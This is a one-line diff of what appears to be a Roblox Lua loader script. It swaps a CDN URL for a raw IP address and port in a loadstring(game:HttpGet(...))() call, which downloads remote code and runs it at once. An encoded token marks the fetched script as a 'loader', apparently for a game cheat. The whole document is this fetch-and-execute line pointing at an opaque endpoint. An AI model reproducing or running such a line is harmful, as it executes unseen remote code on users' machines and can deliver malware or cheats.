@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6Ijk0Njg0MTcwLTNiZDEtNDMwZC1hNGQ4LTI0ZDdlYmNmNjExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
